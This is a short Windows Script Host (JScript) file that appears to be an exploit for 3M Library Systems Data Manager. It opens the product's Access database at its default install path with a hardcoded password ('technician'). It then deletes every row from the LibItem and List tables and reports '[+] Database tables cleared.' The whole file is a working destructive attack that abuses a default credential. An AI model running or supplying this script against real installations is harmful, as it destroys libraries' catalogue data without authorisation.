var conn = new ActiveXObject("ADODB.Connection");
var connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=C:\\Program Files\\3M Library Systems\\Data Manager\\Db\\DataManager.mdb;Jet OLEDB:Database Password=technician;";
try {
    conn.Open(connStr);
    conn.Execute("DELETE FROM [LibItem]");
    conn.Execute("DELETE FROM [List]");
    WScript.Echo("[+] Database tables cleared.");
    conn.Close();
} catch (e) {
    WScript.Echo("Error: " + e.message);
}
